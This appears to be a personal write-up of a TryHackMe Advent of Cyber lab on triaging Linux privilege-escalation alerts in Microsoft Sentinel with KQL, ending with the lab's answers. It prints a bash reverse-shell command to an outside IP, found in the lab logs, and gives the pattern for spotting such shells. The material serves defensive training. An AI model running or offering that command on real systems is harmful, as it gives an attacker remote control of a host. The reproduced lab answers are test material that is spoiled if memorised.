# Advent of Cyber 2025 Day 10 - Tinsel Triage

Learn alert triaging and prioritization techniques while investigating suspicious activities in Microsoft Sentinel, Azure's cloud-native SIEM platform.

## Solution:

**Step 1: Lab Deployment and Access**

- Clicked "Cloud Details" and deployed the lab environment on Azure
- Waited 2-3 minutes before deploying the rules
- Copied the Azure portal URL and accessed it in a new tab
- Logged in using the provided Username and Temporary Access Pass (TAP)

![Azure login page with credentials](https://github.com/user-attachments/assets/placeholder-azure-login.png)

**Step 2: Environment Setup**

- Navigated to Microsoft Sentinel from the Azure Portal search bar
- Selected the dedicated Sentinel instance
- Opened the Logs tab and selected the custom log table `Syslog_CL`
- Ran the query to ensure logs were properly ingested (waited a few minutes for full ingestion)

![Microsoft Sentinel logs view](https://github.com/user-attachments/assets/placeholder-sentinel-logs.png)

**Step 3: Preparing the Sentinel Rules**

- Navigated to Configuration → Analytics tab
- Selected all active rules and clicked "Disable"
- After disabling, selected them again and clicked "Enable" to force trigger the alerts
- Received notification confirming rules were successfully re-enabled

![Analytics rules management](https://github.com/user-attachments/assets/placeholder-rules.png)

**Step 4: Initial Alert Triage**

- Navigated to Threat Management → Incidents tab
- Set custom time range to view all triggered incidents
- Observed 8 open incidents: 4 high severity and 4 medium severity

![Incidents dashboard showing alerts](https://github.com/user-attachments/assets/4407e630-bf89-4c82-80b0-4b3ae2de90f4)

- Prioritized high-severity alerts first (potential privilege escalation and compromise)
- Investigated "Linux PrivEsc - Kernel Module Insertion" alert:
  - 3 events related to the alert
  - 3 entities involved
  - Classified as Privilege Escalation tactic

**Step 5: Alert Correlation and Timeline Analysis**

- Clicked "View full details" to see incident timeline and similar incidents
- Identified multiple alerts pointing to the same affected entities
- Recognized attack pattern:
  1. Root SSH Login from External IP (Initial Access)
  2. SUID Discovery (Privilege Escalation Attempt)
  3. Kernel Module Insertion (Persistence)

**Answering Questions - Part 1:**

Searched for "Linux PrivEsc - Polkit Exploit Attempt":
- Sidebar showed **10 entities** affected

Searched for "Linux PrivEsc - Sudo Shadow Access":
- First column showed **High** severity

Checked "Linux PrivEsc - User Added to Sudo Group":
- Full details tab showed **4** account types added to sudoers group

**Step 6: Deep Dive into Logs with KQL**

- Clicked on "Events" from the Evidence section in alert details
- Switched from Simple mode to KQL mode in the upper-right corner
- Executed custom KQL query for app-02:

```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

Discovered suspicious activity sequence:
- Execution of `cp` command to backup shadow file
- User "Alice" added to sudoers group
- "backupuser" account modified by root
- Malicious module `malicious_mod.ko` inserted
- Successful SSH authentication by root

![KQL query results showing suspicious events](https://github.com/user-attachments/assets/placeholder-kql-results.png)

**Answering Questions - Part 2:**

**For websrv-01 investigation:**
```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'websrv-01'
| project _timestamp_t, host_s, Message
```

- First kernel-related query showed module name: **malicious_mod.ko**
- Found unusual command executed by ops user: `/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1` (reverse shell)
- Top SSH query showed source IP for storage-01: **172.16.0.12**

**For app-01 investigation:**
```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-01'
| project _timestamp_t, host_s, Message
```

- SSH query revealed external IP for root login: **203.0.113.45**
- User added to sudoers besides backupuser: **deploy**

![Final investigation results for app-01](https://github.com/user-attachments/assets/placeholder-app01-results.png)

## Flags/Answers:

**Task 4 Questions:**
```
Entities affected by Polkit Exploit: 10
Severity of Sudo Shadow Access: High
Accounts added to sudoers group: 4
```

**Task 5 Questions:**
```
Kernel module in websrv-01: malicious_mod.ko
Unusual command by ops user: /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
Source IP for storage-01 SSH: 172.16.0.12
External IP for app-01 root login: 203.0.113.45
User added to sudoers in app-01: deploy
```

## Concepts learnt:

* **Alert Triaging**: The process of prioritizing security alerts based on severity, timestamp, attack stage, and affected assets to efficiently allocate SOC resources and respond to real threats while filtering out noise.

* **Microsoft Sentinel**: Azure's cloud-native Security Information and Event Management (SIEM) and Security Orchestration, Automation, and Response (SOAR) platform that collects, detects, investigates, and responds to threats in real-time.

* **KQL (Kusto Query Language)**: Azure's powerful query language used to search and analyze log data in Microsoft Sentinel. Supports filtering, projection, aggregation, and complex data manipulation.

* **Attack Lifecycle Stages**: Understanding how attacks progress through phases: Initial Access → Privilege Escalation → Persistence → Data Exfiltration. Helps analysts determine how far an attacker has progressed.

* **Alert Correlation**: The practice of linking multiple related alerts involving the same entities (users, IPs, machines) to identify broader attack patterns and reconstruct the complete attack path.

* **Incident Timeline Reconstruction**: Building a chronological sequence of events by combining timestamps, user actions, and affected assets to understand how an attack unfolded.

* **Privilege Escalation Detection**: Identifying suspicious activities like kernel module insertion, sudoers group modifications, and SUID discovery that indicate attackers attempting to gain higher-level access.

* **Reverse Shell**: A malicious connection where the target machine initiates an outbound connection to the attacker's machine, bypassing firewall restrictions. Identified by commands like `/bin/bash -i >& /dev/tcp/IP/PORT`.

## Notes:

* **Lab deployment tips**:
  - Full deployment takes 4-5 minutes after pressing Deploy Lab and Deploy Rules
  - Lab access expires after 1 hour
  - If logs don't appear immediately, wait and refresh - ingestion can take a few minutes
  - If encountering "page moved to Defender portal" message, refresh the page

* **Alert triage framework remembered**:
  - **Severity**: How bad is it?
  - **Time**: When did it occur?
  - **Context**: Where in the attack lifecycle?
  - **Impact**: Who/what is affected?

* **Investigation workflow**:
  1. Review high-severity alerts first
  2. Identify affected entities
  3. Correlate related alerts
  4. Build timeline of events
  5. Validate with raw logs using KQL
  6. Document findings and escalate if needed

* **Common privilege escalation indicators**:
  - Kernel module insertion
  - Users added to sudoers group
  - Shadow file modifications
  - SUID binary discovery
  - Root SSH access from external IPs

* **KQL query tips**:
  - Use `where` clause to filter specific hosts
  - `project` limits output to specified columns
  - Timestamp filtering helps focus on relevant time periods
  - Sort by `_timestamp_t` to build chronological timeline

* **Real-world application**: This challenge simulates actual SOC analyst workflows in enterprise environments where hundreds of alerts need efficient triage to identify real threats among false positives.

* **Alternative investigation approaches**:
  - Could use Incident Graph view for visual correlation
  - Entity behavior analytics could help identify anomalous patterns
  - Threat intelligence integration could reveal known malicious IPs

## Resources:

* [TryHackMe - Advent of Cyber 2025 Day 10](https://tryhackme.com/r/room/adventofcyber2025)
  
